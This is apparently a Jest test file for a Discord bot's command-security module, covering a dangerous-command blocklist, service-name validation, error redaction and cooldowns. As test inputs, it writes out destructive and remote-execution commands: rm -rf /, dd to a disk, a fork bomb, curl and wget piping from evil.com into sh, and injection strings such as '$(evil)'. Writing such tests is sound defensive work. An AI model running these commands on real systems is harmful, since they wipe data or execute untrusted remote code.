/**
 * Tests for command security: blocklist, cooldowns, input validation.
 * Does NOT require Discord connection — tests pure functions only.
 */

// We need to extract the pure functions from commands.js
// Since they're not exported, we test via the module's internal logic
// by re-implementing the critical security patterns for validation.

describe('blocked command patterns', () => {
  // Mirror the BLOCKED_COMMANDS patterns from commands.js
  const BLOCKED_COMMANDS = [
    { pattern: /rm\s+(-[^\s]*\s+)*\/(\s|$)/, reason: 'Recursive delete of root filesystem' },
    { pattern: /rm\s+-[^\s]*r[^\s]*\s+\//, reason: 'Recursive delete of root filesystem' },
    { pattern: /mkfs/, reason: 'Filesystem format' },
    { pattern: /dd\s+if=/, reason: 'Raw disk write' },
    { pattern: /:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;?\s*:/, reason: 'Fork bomb' },
    { pattern: /shutdown/, reason: 'System shutdown' },
    { pattern: /\binit\s+0\b/, reason: 'System halt' },
    { pattern: /\bhalt\b/, reason: 'System halt' },
    { pattern: /\bpoweroff\b/, reason: 'System poweroff' },
    { pattern: /curl\s.*\|\s*(ba)?sh/, reason: 'Remote code execution via pipe' },
    { pattern: /wget\s.*\|\s*(ba)?sh/, reason: 'Remote code execution via pipe' },
    { pattern: /\bpython[23]?\s+-c\b/, reason: 'Interpreter code execution' },
    { pattern: /\bperl\s+-e\b/, reason: 'Interpreter code execution' },
    { pattern: /\bruby\s+-e\b/, reason: 'Interpreter code execution' },
    { pattern: /\bnode\s+-e\b/, reason: 'Interpreter code execution' },
    { pattern: />\s*\/etc\//, reason: 'Overwriting system config files' },
    { pattern: />\s*\/boot\//, reason: 'Overwriting boot files' },
    { pattern: /\bchmod\s+[0-7]*777\b/, reason: 'World-writable permissions' },
    { pattern: /\bchown\s.*\/etc\//, reason: 'Changing ownership of system files' },
    { pattern: /LD_PRELOAD=/, reason: 'Library injection' },
    { pattern: /crontab\s.*-r\b/, reason: 'Crontab removal' },
    { pattern: /visudo/, reason: 'Sudoers modification' },
    { pattern: />\s*\/dev\/[sh]d/, reason: 'Raw device write' },
    { pattern: /\bwipe\b/, reason: 'Disk wipe utility' },
    { pattern: /\bshred\b/, reason: 'Secure file deletion' },
  ];

  function checkBlocked(command) {
    for (const { pattern, reason } of BLOCKED_COMMANDS) {
      if (pattern.test(command)) return reason;
    }
    return null;
  }

  // Should BLOCK
  test('blocks rm -rf /', () => {
    expect(checkBlocked('rm -rf /')).toBeTruthy();
  });

  test('blocks rm -rf / with extra flags', () => {
    expect(checkBlocked('rm -rf --no-preserve-root /')).toBeTruthy();
  });

  test('blocks mkfs', () => {
    expect(checkBlocked('mkfs.ext4 /dev/sda1')).toBeTruthy();
  });

  test('blocks dd if=', () => {
    expect(checkBlocked('dd if=/dev/zero of=/dev/sda')).toBeTruthy();
  });

  test('blocks fork bomb', () => {
    expect(checkBlocked(':() { : | : & } ; :')).toBeTruthy();
  });

  test('blocks curl pipe to sh', () => {
    expect(checkBlocked('curl https://evil.com/script.sh | sh')).toBeTruthy();
  });

  test('blocks curl pipe to bash', () => {
    expect(checkBlocked('curl https://evil.com/script.sh | bash')).toBeTruthy();
  });

  test('blocks wget pipe to sh', () => {
    expect(checkBlocked('wget -O - https://evil.com/script.sh | sh')).toBeTruthy();
  });

  test('blocks python -c', () => {
    expect(checkBlocked('python -c "import os; os.system(\'rm -rf /\')"')).toBeTruthy();
  });

  test('blocks python3 -c', () => {
    expect(checkBlocked('python3 -c "exec(code)"')).toBeTruthy();
  });

  test('blocks node -e', () => {
    expect(checkBlocked('node -e "process.exit()"')).toBeTruthy();
  });

  test('blocks perl -e', () => {
    expect(checkBlocked('perl -e "system(cmd)"')).toBeTruthy();
  });

  test('blocks writing to /etc/', () => {
    expect(checkBlocked('echo bad > /etc/passwd')).toBeTruthy();
  });

  test('blocks writing to /boot/', () => {
    expect(checkBlocked('echo x > /boot/grub/grub.cfg')).toBeTruthy();
  });

  test('blocks chmod 777', () => {
    expect(checkBlocked('chmod 777 /var/www')).toBeTruthy();
  });

  test('blocks chown on /etc/', () => {
    expect(checkBlocked('chown user /etc/shadow')).toBeTruthy();
  });

  test('blocks LD_PRELOAD injection', () => {
    expect(checkBlocked('LD_PRELOAD=./evil.so /bin/ls')).toBeTruthy();
  });

  test('blocks crontab -r', () => {
    expect(checkBlocked('crontab -r')).toBeTruthy();
  });

  test('blocks visudo', () => {
    expect(checkBlocked('visudo')).toBeTruthy();
  });

  test('blocks shutdown', () => {
    expect(checkBlocked('shutdown -h now')).toBeTruthy();
  });

  test('blocks halt', () => {
    expect(checkBlocked('halt')).toBeTruthy();
  });

  test('blocks poweroff', () => {
    expect(checkBlocked('poweroff')).toBeTruthy();
  });

  test('blocks shred', () => {
    expect(checkBlocked('shred /dev/sda')).toBeTruthy();
  });

  test('blocks wipe', () => {
    expect(checkBlocked('wipe /dev/sda')).toBeTruthy();
  });

  test('blocks raw device write', () => {
    expect(checkBlocked('echo x > /dev/sda')).toBeTruthy();
  });

  // Should ALLOW
  test('allows safe ls command', () => {
    expect(checkBlocked('ls -la /home')).toBeNull();
  });

  test('allows safe ps command', () => {
    expect(checkBlocked('ps aux')).toBeNull();
  });

  test('allows safe systemctl status', () => {
    expect(checkBlocked('systemctl status nginx')).toBeNull();
  });

  test('allows curl without pipe', () => {
    expect(checkBlocked('curl https://example.com')).toBeNull();
  });

  test('allows tail on logs', () => {
    expect(checkBlocked('tail -100 /var/log/syslog')).toBeNull();
  });

  test('allows rm on specific file (not root)', () => {
    expect(checkBlocked('rm /tmp/test.txt')).toBeNull();
  });

  test('allows chmod with safe permissions', () => {
    expect(checkBlocked('chmod 644 /home/user/file.txt')).toBeNull();
  });
});

describe('input validation', () => {
  const SAFE_NAME_RE = /^[a-zA-Z0-9._-]+$/;

  function isValidServiceName(name) {
    return SAFE_NAME_RE.test(name) && name.length <= 100;
  }

  // Valid names
  test('accepts simple alphanumeric name', () => {
    expect(isValidServiceName('myapp')).toBe(true);
  });

  test('accepts name with dots', () => {
    expect(isValidServiceName('my.app.v2')).toBe(true);
  });

  test('accepts name with hyphens', () => {
    expect(isValidServiceName('my-app')).toBe(true);
  });

  test('accepts name with underscores', () => {
    expect(isValidServiceName('my_app')).toBe(true);
  });

  test('accepts numeric name', () => {
    expect(isValidServiceName('0')).toBe(true);
  });

  // Invalid names
  test('rejects name with spaces', () => {
    expect(isValidServiceName('my app')).toBe(false);
  });

  test('rejects name with semicolons', () => {
    expect(isValidServiceName('myapp;rm -rf /')).toBe(false);
  });

  test('rejects name with pipes', () => {
    expect(isValidServiceName('myapp|evil')).toBe(false);
  });

  test('rejects name with backticks', () => {
    expect(isValidServiceName('myapp`whoami`')).toBe(false);
  });

  test('rejects name with $', () => {
    expect(isValidServiceName('$(evil)')).toBe(false);
  });

  test('rejects empty name', () => {
    expect(isValidServiceName('')).toBe(false);
  });

  test('rejects name over 100 chars', () => {
    expect(isValidServiceName('a'.repeat(101))).toBe(false);
  });

  test('rejects name with slashes', () => {
    expect(isValidServiceName('../etc/passwd')).toBe(false);
  });
});

describe('error sanitization', () => {
  function sanitizeError(message) {
    const patterns = [
      [/\/home\/\S+/g, '/home/***'],
      [/\/etc\/\S+/g, '/etc/***'],
      [/\/var\/\S+/g, '/var/***'],
      [/\/root\/\S+/g, '/root/***'],
      [/password\S*/gi, 'password***'],
      [/token\S*/gi, 'token***'],
      [/\b\d{1,3}(\.\d{1,3}){3}\b/g, '***.***.***.***'],
    ];
    let sanitized = message;
    for (const [pat, rep] of patterns) {
      sanitized = sanitized.replace(pat, rep);
    }
    return sanitized.substring(0, 200);
  }

  test('redacts home paths', () => {
    expect(sanitizeError('Error at /home/user/app.js')).toBe('Error at /home/***');
  });

  test('redacts etc paths', () => {
    expect(sanitizeError('Cannot read /etc/shadow')).toBe('Cannot read /etc/***');
  });

  test('redacts IP addresses', () => {
    expect(sanitizeError('Connection from 192.168.1.100 refused')).toBe('Connection from ***.***.***.*** refused');
  });

  test('redacts password strings', () => {
    expect(sanitizeError('Invalid password123 for user')).toBe('Invalid password*** for user');
  });

  test('redacts token strings', () => {
    expect(sanitizeError('Bad tokenABC123DEF')).toBe('Bad token***');
  });

  test('truncates long messages to 200 chars', () => {
    const longMsg = 'A'.repeat(500);
    expect(sanitizeError(longMsg).length).toBe(200);
  });

  test('handles message with multiple sensitive items', () => {
    const result = sanitizeError('Error at /home/user/app: password=secret123, ip=10.0.0.1');
    expect(result).not.toContain('/home/user');
    expect(result).not.toContain('password=secret123');
    expect(result).not.toContain('10.0.0.1');
  });
});

describe('cooldown logic', () => {
  const cooldowns = new Map();

  function checkCooldown(userId, cmdName, cooldownMs) {
    const key = `${userId}:${cmdName}`;
    const now = Date.now();
    const expiresAt = cooldowns.get(key);
    if (expiresAt && now < expiresAt) {
      const remaining = Math.ceil((expiresAt - now) / 1000);
      return remaining;
    }
    cooldowns.set(key, now + cooldownMs);
    return 0;
  }

  beforeEach(() => {
    cooldowns.clear();
  });

  test('returns 0 on first use', () => {
    expect(checkCooldown('user1', 'status', 3000)).toBe(0);
  });

  test('returns remaining seconds during cooldown', () => {
    checkCooldown('user1', 'exec', 5000);
    const remaining = checkCooldown('user1', 'exec', 5000);
    expect(remaining).toBeGreaterThan(0);
    expect(remaining).toBeLessThanOrEqual(5);
  });

  test('different users have independent cooldowns', () => {
    checkCooldown('user1', 'status', 3000);
    expect(checkCooldown('user2', 'status', 3000)).toBe(0);
  });

  test('different commands have independent cooldowns', () => {
    checkCooldown('user1', 'status', 3000);
    expect(checkCooldown('user1', 'top', 3000)).toBe(0);
  });

  test('cooldown expires after duration', async () => {
    checkCooldown('user1', 'ping', 100); // 100ms cooldown
    await new Promise((r) => setTimeout(r, 150));
    expect(checkCooldown('user1', 'ping', 100)).toBe(0);
  });
});
